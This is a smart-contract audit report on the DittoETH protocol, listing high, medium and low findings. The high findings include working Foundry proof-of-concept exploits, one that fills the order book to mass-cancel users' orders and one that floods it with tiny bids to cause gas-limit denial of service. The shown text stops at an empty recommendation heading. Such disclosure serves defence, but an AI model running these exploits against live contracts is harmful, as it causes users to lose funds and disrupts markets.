# DittoETH - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01.  Users Lose Funds and Market Functionality Breaks When Market Reachs 65k Id](#H-01)
    - ### [H-02. Gas Limit Exploitation and Order Book Blockage Due to High-Priced Bids](#H-02)
- ## Medium Risk Findings
    - ### [M-01. `ZETH` protocol derivative assumes a `~1=1` peg of stETH to ETH](#M-01)
    - ### [M-02. TAPP Mismanagement: Unfair Asset Treatment and Trust Erosion](#M-02)
    - ### [M-03. Possible Dos On  Withdraws from Reth Bridge](#M-03)
    - ### [M-04. there is now withdraw mechanism for ETH in bridge contracts](#M-04)
- ## Low Risk Findings
    - ### [L-01. Incorrect emmited event ](#L-01)
    - ### [L-02. can be delete a bridge that holds some collateral](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: Ditto

### Dates: Sep 8th, 2023 - Oct 9th, 2023

[See more contest details here](https://www.codehawks.com/contests/clm871gl00001mp081mzjdlwc)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 4
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01.  Users Lose Funds and Market Functionality Breaks When Market Reachs 65k Id            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/OrdersFacet.sol#L124C9-L124C9

## Summary

if the orderbook of any market reach 65,000 **dao** can call the function [cancelOrderFarFromOracle](https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/OrdersFacet.sol#L124C10-L124C10) multiple times to cancel many orders up to 1000 order in each transaction ,or anyone can cancle the last order in one **call**.the users who issued the canclled orders will lost thier deposits.and the canclled process is not limited to a certain orders numbers.

## Vulnerability Details

**source** : contracts/facets/OrderFacet.sol </br>
**Function** : [cancelOrderFarFromOracle](https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/OrdersFacet.sol#L124C10-L124C10)

- when ever a user create a limit order (_short limit_,_bid limit_,_ask limit_), if the order did not match it get added to the orderbook, and the `assets amount` or `eth amount` uses to create this order is taken from the _Virtual balance_ of the user in the system .</br> **userVault**(in case of bids and shorts) or **userAsset**(in case of asks) we can see that here :
- ```solidity
        // for asks:
        s.assetUser[asset][order.addr].ercEscrowed -= order.ercAmount;
        // for shorts :
        s.vaultUser[vault][order.addr].ethEscrowed -= eth;
        //for bids :
        s.vaultUser[vault][order.addr].ethEscrowed -= eth;
  ```

  also if there is no id's Recycled behind the **Head** the id for this orders gonna be the current id in `s.asset[asset].orderId`,and the `s.asset[asset].orderId` get increamented by one . this is true for all three types of orders. (shorts,asks,bids).

  - now in case this **ordersId** reach 65k for a specific market, the **DAO** are able to cancle the last 1000 order, and any one can cancle last order in one call. since it's only checks for the **ordersId** > 65000.and by the last order i mean the last order of any time of limit orders (`asks`,`shorts`,`bids`).

    ```solidity
    function cancelOrderFarFromOracle(address asset, O orderType, uint16 lastOrderId, uint16 numOrdersToCancel)
        external
        onlyValidAsset(asset)
        nonReentrant
    {
        if (s.asset[asset].orderId < 65000) {
            revert Errors.OrderIdCountTooLow();
        }

        if (numOrdersToCancel > 1000) {
            revert Errors.CannotCancelMoreThan1000Orders();
        }

        if (msg.sender == LibDiamond.diamondStorage().contractOwner) {
            if (orderType == O.LimitBid && s.bids[asset][lastOrderId].nextId == Constants.TAIL) {
                s.bids.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else if (orderType == O.LimitAsk && s.asks[asset][lastOrderId].nextId == Constants.TAIL) {
                s.asks.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else if (orderType == O.LimitShort && s.shorts[asset][lastOrderId].nextId == Constants.TAIL) {
                s.shorts.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else {
                revert Errors.NotLastOrder();
            }
        } else {
            //@dev if address is not DAO, you can only cancel last order of a side
            if (orderType == O.LimitBid && s.bids[asset][lastOrderId].nextId == Constants.TAIL) {
                s.bids.cancelOrder(asset, lastOrderId);
            } else if (orderType == O.LimitAsk && s.asks[asset][lastOrderId].nextId == Constants.TAIL) {
                s.asks.cancelOrder(asset, lastOrderId);
            } else if (orderType == O.LimitShort && s.shorts[asset][lastOrderId].nextId == Constants.TAIL) {
                s.shorts.cancelOrder(asset, lastOrderId);
            } else {
                revert Errors.NotLastOrder();
            }
        }
    }
    ... ....
    // cancle many orders no extra checks  :
    function cancelManyOrders(
        mapping(address => mapping(uint16 => STypes.Order)) storage orders,
        address asset,
        uint16 lastOrderId,
        uint16 numOrdersToCancel
     ) internal {
        uint16 prevId;
        uint16 currentId = lastOrderId;
        for (uint8 i; i < numOrdersToCancel;) {
            prevId = orders[asset][currentId].prevId;
            LibOrders.cancelOrder(orders, asset, currentId);
            currentId = prevId;
            unchecked {
                ++i;
            }
        }
    }
    ...... .....
    // no extrac checks in  cancleOrder() function also. it set the order to Cancelled , remove it from the list, and Set it to be reused:
    function cancelOrder(mapping(address => mapping(uint16 => STypes.Order)) storage orders, address asset, uint16 id)
        internal
     {
        uint16 prevHEAD = orders[asset][Constants.HEAD].prevId;

        // remove the links of ID in the market
        // @dev (ID) is exiting, [ID] is inserted
        // BEFORE: PREV <-> (ID) <-> NEXT
        // AFTER : PREV <----------> NEXT
        orders[asset][orders[asset][id].nextId].prevId = orders[asset][id].prevId;
        orders[asset][orders[asset][id].prevId].nextId = orders[asset][id].nextId;

        // create the links using the other side of the HEAD
        emit Events.CancelOrder(asset, id, orders[asset][id].orderType);
        _reuseOrderIds(orders, asset, id, prevHEAD, O.Cancelled);
    }


    ```

- as we said the user balance get decreaced by the `value` of it's order he created. but since the order is set to cancelled the user never gonna be able to recieve thier amount back.cause cancelled orders can't be **matched** Neither **cancelled** again.
  - **_Ex_**: </br>
  - a user create a limit bid as follow : {`price: 0.0001 ether`, `amount: 10000 ether`}.
  - when this order get cancelled : the user will loose : 0.0001 \* 10000 = `1 ether` **ZETH** (or **ETH**)
    > the shorters will lose more then others since thier balance get decreaced by : **_PRICE_** \* **_AMOUNT_** \* **_MARGIN_**.
- The second issue is there is _no limit_ for how many orders can be cancelled. you can cancel the whole orders in a market that reaches **65K** **orderId**. `limits shorts` ,`limits asks` or `limit bids` .starting from the last one.since the only Conditionto be able to cancel orders is the asset order ID reached this number. and if it reachs it. it never decrease .even if there is alot of orders **behind head**(non active) to be reused.

- a malicious actor Can targeted this vulnerability by creating numerous tiny `limit asks` pushing the `orderId` to be too high .and he can do so by creating `ask` with a very high **price** and very **small amount** so he can pass the `MinEth` amount check, he can just with less then `1 cusd` (in case of cusd market) create a bunsh of `limit asks` orders .
## POC : 
- using the the main [repo](https://github.com/Cyfrin/2023-09-ditto) setup for testing , here a poc shows how a malicious user can fill the **orderbook** with bunsh of tiny `limit asks` with little cost. and how you can cancle all orders in case the **orderId** reachs 65k. also that there is no refund for the users that created this orders.
```solidity
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.21;

import {Errors} from "contracts/libraries/Errors.sol";
import {Events} from "contracts/libraries/Events.sol";
import {STypes, MTypes, O} from "contracts/libraries/DataTypes.sol";
import {Constants} from "contracts/libraries/Constants.sol";
import "forge-std/console.sol";
import {OBFixture} from "test/utils/OBFixture.sol";
// import {console} from "contracts/libraries/console.sol";

contract POC is OBFixture {
   address[3] private bidders = [address(435433), address(423432523), address(522366)];
   address[3] private shorters = [address(243422243242), address(52353646324532), address(40099)];
    address attacker = address(3234);
   function setUp() public override {
       super.setUp();
   }

       // an attacker can fill the order book with a bunsh of asks that have too high price and low asset 
   function test_fillWithAsks() public {
    // create a bunsh of asks with a high price :
    depositUsd(attacker, DEFAULT_AMOUNT * 10000);
    uint balanceAssetBefore = diamond.getAssetBalance(asset,attacker);
        // minAsk = 0.0001 ether . 0.0001 ether = x * 1 , x =0.0001 ether * 1 ether
        vm.startPrank(attacker);
        for (uint i ; i< 1000 ;i++){
           createLimitAsk(  10**24, 10**10); 
        }
        vm.stopPrank();
        STypes.Order[] memory asks = diamond.getAsks(asset);
        console.log("tiny asks created : ", asks.length);
        console.log( "hack cost asset", balanceAssetBefore - diamond.getAssetBalance(asset,attacker));

   }
   function test_cancleOrders() public {
       //set the assetid to 60000;
       diamond.setOrderIdT(asset,64998);
       // create multiple bids and 1 shorts
       fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, bidders[0]); // id 64998
       fundLimitShortOpt(uint80(DEFAULT_PRICE)*4, DEFAULT_AMOUNT, shorters[0]); //id 64999
       fundLimitBidOpt(DEFAULT_PRICE*2, DEFAULT_AMOUNT, bidders[1]); // id 65000
       fundLimitBidOpt(DEFAULT_PRICE*3 , DEFAULT_AMOUNT, bidders[2]); //id 65001
       /* now we have the lists like this :
        - for bids : Head <- Head <->65001<->65000<->64998->Tail
        - for shorts: Head <- Head <->64999->Tail
        */

       //lets cancle the all the bids :
       canclebid(64998);
       //  - now : Head <-64998<-> Head <->65001<->65000->Tail
       uint s1 = vm.snapshot();
       vm.revertTo(s1);
       canclebid(65000);
       // - now : Head <-64998<->65000<-> Head <->65001->Tail
       uint s2 = vm.snapshot();
       vm.revertTo(s2);
       canclebid(65001);
       // - now : Head <-64998<->65000<->65001<-> Head ->Tail
       // let's check the  active bids :
       STypes.Order[] memory Afterbids = diamond.getBids(asset);
       // notice that we were able to delete all the bids even there was unActive ID's to be reused.
       assertTrue(Afterbids.length == 0);
       // also notice that the owners of this orders did not get refund thier zeth back that have been taken from them when they create this orders.

       for (uint i; i<bidders.length;i++){
        // check that there is no refund for the users : 
           uint ethUser = diamond.getZethBalance(vault,bidders[i]);
           console.log('balance of : ', bidders[i],ethUser);
           assertEq(ethUser ,0);
       }
       // also we can cancle the shorts and the asks, i don't wanna make POC to long , but this is the idea.you can cancle all the orders of a market if this market reach 65000,
       assertEq(diamond.getShorts(asset).length,1);
       diamond.cancelOrderFarFromOracle(asset, O.LimitShort, 64999, 1);
       assertEq(diamond.getShorts(asset).length,0);

   }
   function canclebid(uint16 id) public {
       diamond.cancelOrderFarFromOracle(asset, O.LimitBid, id, 1);
   }


}


```

- console after running test :

```sh
    [PASS] test_cancleOrders() (gas: 1218326)
Logs:
  balance of :  0x000000000000000000000000000000000006A4E9 0
  balance of :  0x00000000000000000000000000000000193d114b 0
  balance of :  0x000000000000000000000000000000000007f87E 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 222.12ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
- for creating bunsh of tiny asks : 
```sh
[PASS] test_fillWithAsks() (gas: 860940067)
Logs:
  tiny asks created :  1000
  hack cost asset 10000000000000 (which is less then 1 cusd) 

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.17s
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
## impact :

1.  users will lose thier `zeth` or `Erc` pagged asset dependens on the order type .
2.  any type of orders in this market (`shorts`,`asks`,`bids`) can be effected and cancelled even if there is a lot of **non active** ids to be reused.
3.  the whole orders in a market can be canncelled without refunding the orders creators.

## tools used : 
manual review
## Recommendations :

before cancling the orders , check that there is no orders to be reuse or the diffrence between the current orderId (`s.asset[asset].orderId`) , and the orders to be reused (behind the Head) of this market are Greater then 65000.

```sudo
// sudo code recommand , but it's really depends on the team how to handle that:
 if (s.asset[asset].OrderId) - (shorts.unActiveIds + asks.unActiveIds + bids.unActiveIds) < 65k revert.
```


## <a id='H-02'></a>H-02. Gas Limit Exploitation and Order Book Blockage Due to High-Priced Bids            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/BidOrdersFacet.sol#L39

https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/AskOrdersFacet.sol

https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/libraries/LibOrders.sol#L627

## Summary:

- In scenarios where there are no existing `asks` or `shorts` in a specific market order book, a malicious user can disrupt the market. By flooding the market with numerous small `bids` at an exceptionally high price, this will lead to :
 prevent new `limit asks` or `limit shorts` from being created below their bid price(which too high) cause the matching algorithm will reach the **gasLimit** matching a bunsh of small `bids` with the incoming `sell order`.also No bids below his price will get matched. and the liquidation process in `primaryMarginCall` will not be possible for `short records`.



## Vulnerability Details:

The vulnerability arises cause the way how matching algorithm in function `sellMatchAlgo` in the `LibOrders.sol` library matches incoming `ask` with the highest `bid`. Here's how the problem unfolds:

1. **Matching Algorithm Flaw**:

   - when a new ask is created,it's get created in the `AskOrdersFacet` in function `createAsk` triggering the `sellMatchAlgo()` function.

   ```solidity
   function createAsk(
        address asset,
        uint80 price,
        uint88 ercAmount,
        bool isMarketOrder,
        MTypes.OrderHint[] calldata orderHintArray
    ) external isNotFrozen(asset) onlyValidAsset(asset) nonReentrant {
        uint256 eth = price.mul(ercAmount);
        uint256 minAskEth = LibAsset.minAskEth(asset);
        if (eth < minAskEth) revert Errors.OrderUnderMinimumSize();
        ......
        .......
        LibOrders.sellMatchAlgo(asset, incomingAsk, orderHintArray, minAskEth);//@audit ..
    }
   ```

   - If the `ask` **price** is less than or equal to the highest `bid` **price** and the ask amount is less than the highest bid amount, the ask matches with the bid and doesn't get added to the order book.
   - The highest `bid` matched stays as the highest bid in the `bids` list with less `amount` .
     > bidOrder.amount = StartingAmount - MatchedAmount. </br>
     > and the bidder will get his erc tokens in thier virtual balance in the system. as we see in this snippet code :

   ```solidity
   // when the  : amount  ask < amount bid
    else {
         //update the erc amount of the highest bid ,by sub the ask amount erc
        s.bids[asset][highestBid.id].ercAmount = highestBid.ercAmount - incomingAsk.ercAmount;
        updateBidOrdersOnMatch(s.bids, asset, highestBid.id, false);
       }
       incomingAsk.ercAmount = 0; // set ask ercAmount to zero.
       matchIncomingSell(asset, incomingAsk, matchTotal);
       return;
       .............................................................

   // match highest bid when amount ask < amount bid :
   function matchHighestBid(STypes.Order memory incomingSell,STypes.Order memory highestBid,address asset,
       MTypes.Match memory matchTotal
   ) internal {
       ...
       ...
       s.assetUser[asset][highestBid.addr].ercEscrowed += fillErc;
   }
   ```

2. **Exploitable Scenario**:

   - The vulnerability emerges when there are no existing `asks` or `shorts` in the order book. (or even if there is but the attacker should buy them all).
   - A malicious user can exploit this by :

   1. creating a `bid` with an exorbitantly high price. Then, they create an `ask` with the same price but slightly less in amount (e.g., 10 wei lower). This left a tiny highest `bid` in the order book.

   2. The user then create another bid with a slightly higher price than the existing highest bid (`1wei`). and another ask that matches with this new highest bid but left a tiny amount again. now E.g. we have :
      | Bids Price | Bids Amounts |
      |------------|-------------|
      | 1 | 100 |
      | 2 | 340 |
      | 100 | 0.001 |
      | 100.01 | 0.001 |

3. repeating this process in a loop. This results in bunsh of tiny bids with disproportionately high prices in the order book.

4. **Gas Limit and Reversion**:

   - When a new regular ask is created with a standard price, due to the existence of these numerous tiny high-priced bids, the matching algorithm starts looping through all these bids to match the incoming ask.
   - However, because there are many tiny bids, the transaction reaches the **_gas limit_** before the entire ask amount is matched. This premature termination of the transaction leads to a revert,
   - `NOTICE` that the askers can't create an ask that have tiny amount with the same price of the bidder to match with a Reasonable number of `bids` that not gonna reach the gas limit . that's because there is a `minAmountEth` which is :

     > `price * amount ` > `mintEth` </br>

     assume the following :

     - the Malicious user create **1000** bid. the highest bid is : </br>
       {price : `1 ether + 1000 wei` , amount : `10 wei`}</br>
       the price in each previous bid is `1 wei` less . so the first bid is : </br>
       {price : `1 ether` , amount : `10 wei`}
     - now let's calculate the minimum amount of erc tokens (pagged asset) that an asker can create ask with it at the highest price (`1 ether` for each asset which too high). </br>
     - assume `MinEth` is : `0.001 ether` </br>.
       we have :
       - **MinEth** = **Price** \* **ErcAmount**  </br>
       - **ErcAmount** = **MinEth** / **price** </br>
         so the min erc amount at the price the malicious user set as the highest bid will be :</br>
         **ercAmount** = 0.001 ether \* 1 ether / 1 ether = **_1000000000000_** `wei`.</br>

   - **However**, the sum of all the malicious bid amounts from highest to lowest is: `1000 × 10 = 10000 wei`. Even if an ask attempts to match the highest bid price, the ask still needs to have a large amount, leading to looping through all these tiny bids. This looping process causes the transaction to reach the gas limit, resulting in a premature termination of the transaction.
  -  The same is applicable for `shorts limits`.
   - for bidders there is no incentive to create a `bid` that's higher than this price.(which toooo high)
   - the attack will not cost the malicious user too much , since he is matching with it self. the eth amount will cost him for the example provided around : **10000** `wei`and gas fee.
 - **by doing this an attacker can set above the highest bid price,an ask order with with slitlly higher price but with a larger amount that he buy before . forcing the shorters to buy at his price to close thier debt. or just lose thier collateral in case of secondary call for example**.
## poc 
- using the same [repo](https://github.com/Cyfrin/2023-09-ditto) setup for testing,this is the POC .
```solidity 
pragma solidity 0.8.21;

import {Errors} from "contracts/libraries/Errors.sol";
import {Events} from "contracts/libraries/Events.sol";
import {STypes, MTypes, O} from "contracts/libraries/DataTypes.sol";
import {Constants} from "contracts/libraries/Constants.sol";
import "forge-std/console.sol";
import {OBFixture} from "test/utils/OBFixture.sol";
// import {console} from "contracts/libraries/console.sol";

contract POC is OBFixture {
    address[3] private users = [address(435433), address(423432523), address(522366)];
    address attacker = address(424234234232342);
    function setUp() public override {
        super.setUp();
        vm.label(attacker,"attacker");
        // first create some pagged assets by matching shorts with bids 
        fundLimitBidOpt(DEFAULT_PRICE*3, DEFAULT_AMOUNT * 100, users[0]); 
        fundLimitBidOpt(DEFAULT_PRICE * 2, DEFAULT_AMOUNT * 50, users[0]); 
        fundLimitShortOpt(uint80(DEFAULT_PRICE), DEFAULT_AMOUNT*150, users[0]);
        // give the attacker some assets : 
        depositEth(attacker,DEFAULT_AMOUNT * 100);
        depositUsd(attacker, DEFAULT_AMOUNT * 1000);
    }
    function attacker_setup() public { 
        // check his balance before the bunsh of bids he will create : 
        uint  balanceZethBefore = diamond.getZethBalance(vault,attacker);
        uint balanceAssetBefore = diamond.getAssetBalance(asset,attacker);
        vm.startPrank(attacker);
        uint16 id;
        uint80 latestPrice;
        for (uint i;i<5000;i++){ 
            if(i == 0){
                latestPrice = DEFAULT_PRICE *50;
            }
            // fundLimitBidOpt(latestPrice , DEFAULT_AMOUNT ,attacker);
            createLimitBid(latestPrice, DEFAULT_AMOUNT);
            // get highest bid : 
            (, id) = diamond.getBidKey(asset,1);
             latestPrice = diamond.getBidOrder(asset,id).price;
            //  console.log(latestPrice);
            // create ask with same price , and amount less 1 wei: 
            createLimitAsk( latestPrice, DEFAULT_AMOUNT - 80);

            latestPrice += 1;//2wei;
        }
        vm.stopPrank();
        STypes.Order[] memory bids = diamond.getBids(asset);
        console.log( "hack cost zeth",  balanceZethBefore - diamond.getZethBalance(vault,attacker));
        console.log( "hack cost asset", balanceAssetBefore - diamond.getAssetBalance(asset,attacker));
        console.log("bids that attacker create :",bids.length);
       console.log("amount in each bid ",bids[4].ercAmount);

        
    }

    function test_reachGasLimit() public {
       attacker_setup();
         uint before = gasleft();
        fundLimitAskOpt(DEFAULT_PRICE*3, DEFAULT_AMOUNT, users[0]); 
        uint afterr = gasleft();
        console.log("gasUsed" , before - afterr);
    }

}
```
- console after running test : 
```sh
 Compiler run successful!

Running 1 test for test/poc.sol:POC
[PASS] test_reachGasLimit() (gas: 723550417)
Logs:
  hack cost zeth 9999
  hack cost asset 0
  bids that attacker create : 5000
  amount in each bid  80
  gasUsed 35013047

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.50s
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
## Impact
1 . **shorters can't close thier position**: the shorters will be at risk to not be able to close thier `debt` position . only if they buy the ***ercAsset*** above the price the attacker set. which likelly will be the attacker `ask`.
2. **Limited Order Creation**: Users are restricted from creating `asks` (both limit and market) and setting `shorts limits` below the price set by the attacker. This restriction significantly hampers market activities since there's no incentive for legitimate bidders to buy the pegged asset at an inflated price.

3. **Blocked Order Book Functionality**: Bids placed below the attacker's price will never match with any asks, effectively blocking the entire order book from functioning below the attacker's specified price. This obstruction disrupts the natural trading process and prevents legitimate buyers and sellers from interacting in the market.

4. **Impaired Liquidation Process**: The primary liquidation mechanism becomes impractical because it relies on creating a `forceBid`, which behaves like a regular bid order. However, these force bids, similar to other bids, won't match due to the artificially inflated price. Consequently, the primary liquidation process is rendered ineffective, preventing the clearing of outstanding positions and increasing the risk of market instability.
5. users who tried to create an ask or short limit. will pay a high **gas fee** . and the transaction will revert at the end.

## Tool used
**Manual Review**
## Recommendation
I would recommend Adding a limit orders to match in the algorithm. that not exceed the block limit gas.

		
# Medium Risk Findings

## <a id='M-01'></a>M-01. `ZETH` protocol derivative assumes a `~1=1` peg of stETH to ETH            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto



## Vulnerability Details
- The protocol implements the ETH derivative for the Lido protocol. The `stETH` token is the liquid representation of the ETH staked in this protocol.
- the `BridgeSteth` contrat is assuming a peg of **1 ETH ~= 1 stETH**.

```solidity
function deposit(address from, uint256 amount) external onlyDiamond returns (uint256) {
        // Transfer stETH to this bridge contract
        // @dev stETH uses OZ ERC-20, don't need to check success bool
        steth.transferFrom(from, address(this), amount);
        return amount;
    }
```
- Even though both tokens have a tendency to keep the peg, this hasn't been always the case as it can be seen in this [dashboard](https://dune.com/LidoAnalytical/Curve-ETHstETH). There have been many episodes of market volatility that affected the price of `stETH`, notably the one in last June when `stETH` traded at ~0.93 ETH.

- a user can deposit `stETH` to the system and get a virtual balance of `ZETH` Derivative that stands for `ETH`  by approving `stETH` to the bridge contract. then calling the function `deposit()` from `BridgeRouterFacet`.

```solidity
function deposit(address bridge, uint88 amount) external nonReentrant onlyValidBridge(bridge) {
        if (amount < Constants.MIN_DEPOSIT) revert Errors.UnderMinimumDeposit();
        // @dev amount after deposit might be less, if bridge takes a fee

        uint88 zethAmount = uint88(IBridge(bridge).deposit(msg.sender, amount)); // @dev(safe-cast)

        uint256 vault;
        if (bridge == rethBridge || bridge == stethBridge) {
            vault = Vault.CARBON;
        } else {
            vault = s.bridge[bridge].vault;
        }

        vault.addZeth(zethAmount);
        maybeUpdateYield(vault, zethAmount);
        emit Events.Deposit(bridge, msg.sender, zethAmount);
    }
```

- the user passes the `bridge` address. which in this case `BridgeSteth` and the amount wanna deposit.
- this function calls the bridge that the user provided and the bridge get the tokens from the user. and return the amount getted from the user.
- then The protocol increases the **virtual balance** of the user in the system by the same amount of `stETH` the user deposited . in the function `addZeth` from `LibVault`.

```solidity
    function addZeth(uint256 vault, uint88 amount) internal {
        AppStorage storage s = appStorage();
        s.vaultUser[vault][msg.sender].ethEscrowed += amount;
        s.vault[vault].zethTotal += amount;
    }
```

- the user then can `withdraw` this `Zeth` virtuals balance through any bridge in this _vault_. and in our case we have two bridges in this _vault_. the `RethBridge` and `stETHBridge`.
- no the vulnerability arises when for example as we said the price of `stETH` is less than `ETH` then a malicious user can create a massive profit from that. by depositing `stETH` and withdrawing `REth` through `RethBridge`. since the protocole don't Differentiate between the two since they are in the same **vault** you can deposits with any bridge and withdraw with any bridge you want.
## Impact
The protocol's vulnerability allows malicious users to exploit price disparities between `stETH` and `ETH`. By depositing undervalued `stETH` and withdrawing overvalued `Reth` through different bridges within the same vault, these users can generate substantial profits, posing a significant financial risk to the protocol.
## Tools Used
manual review 

## <a id='M-02'></a>M-02. TAPP Mismanagement: Unfair Asset Treatment and Trust Erosion            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/MarketShutdownFacet.sol#L30

## Summary
- The **TAPP** (Treasury Asset Protection Pool) mechanism, designed to safeguard market stability during price shocks, has been observed to operate counter to its intended purpose. Specifically, during market shutdowns triggered by undercollateralization, the **TAPP** seizes remaining collateral above `1:1` ratio , leaving users with pegged assets at a loss often cause **TAPP** claims collateral before users can redeem their assets, resulting in reduced values during high volatility events.Additionally there is no try to refund when Ratio is under `1:1`. leaving the users to take the loss.
## Vulnerability Details
-  the protocol claims that the **TAPP**(Treasury Asset Protection Pool) Used  to back under collateralized markets in case of black Swans,and Protecting **Ditto** users who are holding the pegged assets from loss.
> [TAPP](https://dittoeth.com/technical/blackswan#local-black-swan): </br>
The Treasury Asset Protection Pool (TAPP) is used for bolstering the stability of market pegged assets during periods of large price shock movements....

- however that's not true in case of market shutdown,in fact the oposit is true .
- in case of a market became under collateralized *anyone* can call `shutdownMarket` function from [MarketShutdownFacet](https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/MarketShutdownFacet.sol#L30) facet and close this market. 
```solidity
   function shutdownMarket(address asset) external onlyValidAsset(asset) isNotFrozen(asset) nonReentrant {
        uint256 cRatio = _getAssetCollateralRatio(asset);
        if (cRatio > LibAsset.minimumCR(asset)) {
            revert Errors.SufficientCollateral();
        } else {
            STypes.Asset storage Asset = s.asset[asset];
            uint256 vault = Asset.vault;
            uint88 assetZethCollateral = Asset.zethCollateral;
            s.vault[vault].zethCollateral -= assetZethCollateral;
            Asset.frozen = F.Permanent;
            if (cRatio > 1 ether) {
                // More than enough collateral to redeem ERC 1:1, send extras to TAPP
                //@audit-issue : the tap should only take the remaining eth , after the users get claimed thier, not before.
                uint88 excessZeth = assetZethCollateral - assetZethCollateral.divU88(cRatio);
                s.vaultUser[vault][address(this)].ethEscrowed += excessZeth;
                // Reduces c-ratio to 1
                Asset.zethCollateral -= excessZeth;
            }
        }
        emit Events.ShutdownMarket(asset);
    }
```
- as we can see the The market will close under the minimum ratio .however the **minimum ratio** it doesn't mean Necessarily `1:1`.
- we see if the market is above `1` ratio .the **TAPP** will take the remaine collateral and let's this market with  `1:1` ratio.
```solidity
if (cRatio > 1 ether) {
                // More than enough collateral to redeem ERC 1:1, send extras to TAPP
                ......
}
```
- Then any user who hold the `ERC` pegged assets can redeem his eth. here : 
```solidity
 function redeemErc(address asset, uint88 amtWallet, uint88 amtEscrow)
        external
        isPermanentlyFrozen(asset)
        nonReentrant
    {
        if (amtWallet > 0) {
            asset.burnMsgSenderDebt(amtWallet);
        }

        if (amtEscrow > 0) {
            s.assetUser[asset][msg.sender].ercEscrowed -= amtEscrow;
        }

        uint88 amtErc = amtWallet + amtEscrow;
        uint256 cRatio = _getAssetCollateralRatio(asset);
        // Discount redemption when asset is undercollateralized
        uint88 amtZeth = amtErc.mulU88(LibOracle.getPrice(asset)).mulU88(cRatio);
        s.vaultUser[s.asset[asset].vault][msg.sender].ethEscrowed += amtZeth;
        emit Events.RedeemErc(asset, msg.sender, amtWallet, amtEscrow);
    }
```
- `Notice` that the users will get less value. then thier **ERC** pagged asset value if ration is `CR < 1`.and in market shutdown events, where the **TAPP** enforces a 1:1 collateral ratio first, frequently occur during periods of high market volatility. In such situations, users experience amplified losses as the **TAPP** claims remaining assets about a `1:1` ratio, while the `collaterall` price continues to crash. 
- also `Notice` That In the event of a market becoming *undercollateralized*, the TAPP does not intervene to refund or stabilize the market. Instead, it allows users to suffer losses without attempting to mitigate or share the burden, contrary to its claimed purpose.

- so **TAPP** behaves inversely: users face losses while the protocol benefits, contrary to what should occur in such situations.
  
- Furthermore, honest `shorters` with Healthy **shortRecords** and high **C-ratios** will face substantial losses. They are unfairly penalized for the unhealthy **shortRecords**, resulting in the loss of their positions and collateral holdings. 

## Tools Used
Manual review.
## Recommendations
I would recommend : 
- set a claim period for users holding **asset** to redeem thier eth : 
- if  **CR** **<** **1** . try to refund the market from the **TAPP** balance if it's posssible. 
- after the Claim Ends or there is no left **Debt**(you can track this by decreasing the debt from `Asset` each time a user redeemed). if there is a remaining collateral add it to the **TAPP** balance. which would be more Efficient for protocol and users.

## <a id='M-03'></a>M-03. Possible Dos On  Withdraws from Reth Bridge            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/bridges/BridgeReth.sol#L98

https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L157-L172

https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/BridgeRouterFacet.sol

## summary :
- The RocketPool `rETH` tokens deposit delay, can prevent Ditto protocol users from withdrawing `RETH` or unstaking for `ETH` if others have recently staked. Future changes to this delay could lead to a denial-of-service attack, rendering the unstaking mechanism unusable. Malicious actors could exploit this to block all withdrawal attempts, causing significant disruptions in user transactions and functionality.

## Vulnerability Details:
- **RocketPool** rETH tokens have a [deposit delay](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L157-L172) that prevents any user who has recently deposited to **transfer** or **burn** tokens. In the past this delay was set to 5760 blocks mined (aprox. 19h, considering one block per 12s). This delay can prevent **Ditto** protocol users from **withdrawing** `RETH` or unstaking `ETH` if another user staked recently through [RethBridge](https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/bridges/BridgeReth.sol#L98).

- While it's not currently possible due to **RocketPool's** configuration, any future changes made to this delay by the admins could potentially lead to a denial-of-service attack on the **withdraw()** and **unstakeEth()** functions through [RethBridge](https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/bridges/BridgeReth.sol#L98) contract. which is a major functionality of the protocol.
- Currently, the delay is set to zero, but if `RocketPool` admins decide to change this value in the future, it could cause issues. Specifically, protocol users **deposit**  actions could prevent other users from **withdrawing** .</br>
- Given that many users **depositting** throughout the day, the delay would constantly reset, making the **withdrawing**  mechanism unusable.
- A malicious actor can also exploit this to be able to block all **withdraws** calls. Consider the following scenario where the delay was raised again to 5760 blocks. malicious call **depositEth(address bridge)** from **diamond**  passing **RETH** bridge.with the *minimum* amount, consequently triggering deposit to `RocketPool` and resetting the deposit delay. Alice tries to unstake her funds, but during rETH burn, it fails due to the delay check, reverting the **withdraw** call.

- If Bob manages to repeatedly **deposit()** the minimum amount every 19h (or any other interval less then the deposit delay), all future calls to **withdraw** will revert.

## Recommends : 
